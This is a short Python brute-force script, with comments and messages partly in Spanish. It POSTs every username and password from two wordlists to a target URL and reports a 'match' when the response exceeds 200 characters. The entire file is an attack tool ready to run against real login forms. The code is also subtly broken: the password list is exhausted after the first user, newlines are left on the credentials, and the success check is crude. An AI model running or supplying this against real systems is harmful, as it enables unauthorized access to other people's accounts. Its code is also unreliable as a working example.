#!/usr/bin/python3
#brute force python
import sys
from requests import post


if len(sys.argv) != 4:
	print('Usage {} userlist passwordlist url'.format(sys.argv[0]))
	sys.exit(0)

filenameUserlist = str(sys.argv[1])
filenamePasswordlist = str(sys.argv[2])
url = str(sys.argv[3])

userlist = open(filenameUserlist, 'r')

passwordlist = open(filenamePasswordlist, 'r')


foundPassword = []

failStr = "Invalid username"

failStr2 = "Invalid password"

var = 0
for user in userlist:
	for password in passwordlist:
		print(password)
		data = post(url, data = {'username':user, 'password':password})
		response = data.text
		print(data.text)
		if(len(response) > 200):
			foundPassword.append(user+":"+password)
			print("Match")
		print("No match"+str(var))
		var += 1
			
if len(foundPassword) > 0:
	print("Se ha encontrado un password")
	for name in foundPassword:
		print(name)
else:
	print("No se encontraron passwords")